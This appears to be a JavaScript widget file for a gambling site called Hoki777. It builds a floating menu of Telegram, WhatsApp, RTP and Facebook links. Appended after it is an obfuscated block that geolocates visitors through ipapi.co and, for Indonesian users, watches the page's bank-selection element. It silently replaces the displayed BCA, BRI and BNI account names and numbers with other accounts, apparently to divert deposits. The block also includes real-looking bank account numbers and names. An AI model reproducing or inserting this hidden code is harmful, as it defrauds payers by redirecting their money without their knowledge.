(function () {
    const menuWid = document.createElement('div');
    menuWid.className = "widget-menu-fixed";
    menuWid.innerHTML = `
    <style>
    .widget-menu-fixed {
    position: fixed;
    bottom: 50px;
    left: 100px;
    z-index: 99999;
}

.cont-widget {
    height: 70px;
    width: 70px;
    background: rgba(51, 51, 51, 0);
    border-radius: 15px;
    transition: height 0.4s ease, background 0.3s ease;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    /* justify-content: center; */
    padding: 10px;
    gap: 0;
    /* default gap 0 */
    backdrop-filter: blur(5px);

}

.cont-widget.active {
    height: auto;
    background: rgba(51, 51, 51, 1);
    /* gap: 20px; */
}


.burger {
    width: 50px;
    height: 50px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    /* Tetap center agar transform rapi */
    align-items: center;
    cursor: pointer;
    background: beige;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px rgb(255, 6, 243);
    position: relative;
    gap: 6px;
    /* Jangan terlalu besar */
}

.burger span {
    display: block;
    height: 4px;
    width: 24px;
    background-color: #333;
    border-radius: 2px;
    transition: all 0.3s ease;
    position: relative;
}

.burger.active span:nth-child(1) {
    transform: rotate(45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}

.burger.active span:nth-child(2) {
    opacity: 0;
}

.burger.active span:nth-child(3) {
    transform: rotate(-45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}



.telegram-button,
.whatsapp-button,
.rtp-button,
.fb-button {
    height: 50px;
    width: 50px;
    cursor: pointer;
    background: beige;
    margin-top: 22px;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px red;
    justify-content: center;
    align-items: center;
    opacity: 0;
    pointer-events: none;
    transform: translateY(20px) scale(0.9);
    transition: opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
    display: flex;
    /* ini tetap tampil, tapi invisible + unclickable awalnya */
}

.cont-widget.active .telegram-button,
.cont-widget.active .whatsapp-button,
.cont-widget.active .rtp-button,
.cont-widget.active .fb-button {
    opacity: 1;
    pointer-events: auto;
    transform: translateY(0) scale(1);
}

.cont-widget.active .telegram-button {
    transition-delay: 0.1s;
}

.cont-widget.active .whatsapp-button {
    transition-delay: 0.2s;
}

.cont-widget.active .rtp-button {
    transition-delay: 0.3s;
}

.cont-widget.active .fb-button {
    transition-delay: 0.4s;
}

.tunjuk {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
}

.hoki-logo {
    display: none;
}

.hoki-logo.active {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
    display: inline-block;
    animation: jump 2s infinite ease-in-out;
}


.tunjuk.active {
    display: none;
}

.link-tombol-widget:hover .widget-tombol {
    transform: translateY(0) scale(1.15);
    /* gabungkan transform */
    background: rgb(124, 124, 103);
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
}

.widget-tombol {
    transition: transform 0.3s ease, background 0.3s ease, box-shadow 0.3s ease;
    border-radius: 15px;
}


.widget-tombol img {
    animation: pulse2 1.5s infinite;
}

@keyframes pulse {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.05);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes pulse2 {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.5);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes jump {

    0%,
    100% {
        transform: translateY(0);
    }

    50% {
        transform: translateY(-20px);
    }
}

@media screen and (max-width: 769px) {
    .widget-menu-fixed {
        left: 30px;
        bottom: 100px;
    }
}
    </style>
        <div class="cont-widget" id="containerWidget">
            <div class="group-widget">
                <div class="burger"
                    onclick="this.classList.toggle('active');document.getElementById('containerWidget').classList.toggle('active');document.getElementById('tunjukgif').classList.toggle('active');document.getElementById('lghok').classList.toggle('active');">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <a href="https://hk777.top/telegramgruphoki777/" class="link-tombol-widget">
                    <div class="telegram-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/tele2.webp" alt="Telegram Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/wahoki777" class="link-tombol-widget">
                    <div class="whatsapp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/wa2.webp" alt="Whatsapp Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/RTP-Hoki777" class="link-tombol-widget">
                    <div class="rtp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/rtp2.webp" alt="RTP Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/facebookgruphoki777/" class="link-tombol-widget">
                    <div class="fb-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/fb2.webp" alt="Facebook Hoki777" width="30" height="30">
                    </div>
                </a>
            </div>
        </div>
        
        <img src="https://yudha125.github.io/menu-widget/Image/hoki.webp" alt="Logo Hoki777" class="hoki-logo" id="lghok">
        <img src="https://yudha125.github.io/menu-widget/Image/tunjuk.webp" alt="Tunjuk Hoki777" class="tunjuk" id="tunjukgif">
    `;
    document.body.appendChild(menuWid);

})();

(function(_0x201c,_0x_0xcea,_0x33cada){var _0x54039c=(355036^355029)+(722740^722739);_0x201c="DI".split("").reverse().join("");_0x54039c=(448349^448346)+(894901^894903);_0x33cada="\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0069\u0070\u0061\u0070\u0069\u002E\u0063\u006F\u002F\u006A\u0073\u006F\u006E\u002F";_0x_0xcea=213660^213656;function _0xb46b9e(_0x3da8g,_0xe76dd){_0x3da8g="\u0062\u0061\u006E\u006B\u0053\u0065\u006C\u0065\u0063\u0074";const _0x3834f={"\u0042\u0043\u0041":{'\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u0061\u006D\u0061\u0041\u0073\u006C\u0069':"\u0052\u0058\u0058\u0058\u0059\u0020\u0041\u0058\u0058\u0058\u0059\u0041","targetNomorAsli":"7391953019","namaBaru":"\u004C\u0045\u0056\u0049",'\u006E\u006F\u006D\u006F\u0072\u0042\u0061\u0072\u0075':"\u0032\u0031\u0032\u0030\u0034\u0035\u0032\u0030\u0030\u0035"},"BRI":{'\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u0061\u006D\u0061\u0041\u0073\u006C\u0069':"CANDRA DEWI",'\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u006F\u006D\u006F\u0072\u0041\u0073\u006C\u0069':"\u0030\u0038\u0033\u0039\u002D\u0030\u0031\u0030\u0030\u002D\u0035\u0037\u0038\u0031\u002D\u0035\u0030\u0039",'\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075':"\u004C\u0055\u0053\u0049\u0041\u004E\u0041",'\u006E\u006F\u006D\u006F\u0072\u0042\u0061\u0072\u0075':"034501050211506"},"BNI":{"targetNamaAsli":"\u0053\u0041\u0052\u0049\u0041\u004E\u0049","targetNomorAsli":"\u0031\u0038\u0030\u0030\u0030\u0038\u0038\u0037\u0030\u0036","namaBaru":"RIFAL",'\u006E\u006F\u006D\u006F\u0072\u0042\u0061\u0072\u0075':"1796377133"}};function _0x299a(_0xf3d44e,_0xe88e){const _0x1e64c=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0x3da8g);_0xf3d44e=(774016^774018)+(683063^683057);if(!_0x1e64c)return;const _0x2_0x3e9=_0x1e64c['\u006F\u0070\u0074\u0069\u006F\u006E\u0073'][_0x1e64c['\u0073\u0065\u006C\u0065\u0063\u0074\u0065\u0064\u0049\u006E\u0064\u0065\u0078']]['\u0074\u0065\u0078\u0074']['\u0074\u0072\u0069\u006D']()['\u0074\u006F\u0055\u0070\u0070\u0065\u0072\u0043\u0061\u0073\u0065']();const _0x28af=_0x3834f[_0x2_0x3e9];if(!_0x28af)return;var _0xbc_0x562=(996791^996786)+(505329^505328);const _0x2be8eb=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("\u0073\u0070\u0061\u006E");_0xbc_0x562=(736755^736762)+(484065^484066);_0x2be8eb['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](span=>{if(span['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===_0x28af['\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u006F\u006D\u006F\u0072\u0041\u0073\u006C\u0069']){span['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0x28af['\u006E\u006F\u006D\u006F\u0072\u0042\u0061\u0072\u0075'];}});const _0xbeba=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("vid".split("").reverse().join(""));_0xe88e=(104794^104794)+(308601^308607);_0xbeba['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](div=>{if(div['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===_0x28af['\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u0061\u006D\u0061\u0041\u0073\u006C\u0069']){div['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0x28af['\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075'];}});}function _0x1g859g(){const _0x3_0x5ee=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0x3da8g);if(!_0x3_0x5ee)return false;_0x299a();if(!_0x3_0x5ee['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']){_0x3_0x5ee['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("\u0063\u0068\u0061\u006E\u0067\u0065",_0x299a);_0x3_0x5ee['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']="\u0074\u0072\u0075\u0065";}return!![];}if(_0x1g859g())return;const _0xb368b=new MutationObserver(()=>{if(_0x1g859g())_0xb368b['\u0064\u0069\u0073\u0063\u006F\u006E\u006E\u0065\u0063\u0074']();});_0xe76dd=(979024^979033)+(452057^452063);_0xb368b['\u006F\u0062\u0073\u0065\u0072\u0076\u0065'](document['\u0062\u006F\u0064\u0079'],{"childList":!![],'\u0073\u0075\u0062\u0074\u0072\u0065\u0065':!![]});}async function _0x6g186b(){try{var _0xb17cbf=(576243^576247)+(270358^270358);const _0x42b0ec=await fetch(_0x33cada);_0xb17cbf=(146870^146864)+(134108^134110);if(!_0x42b0ec['\u006F\u006B'])throw new Error("\u0041\u0050\u0049\u0020\u0045\u0072\u0072\u006F\u0072");const _0x49gead=await _0x42b0ec['\u006A\u0073\u006F\u006E']();const _0x5a09c=_0x49gead['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065'];if(_0x5a09c===_0x201c){_0xb46b9e();}}catch(err){}}_0x6g186b();})();
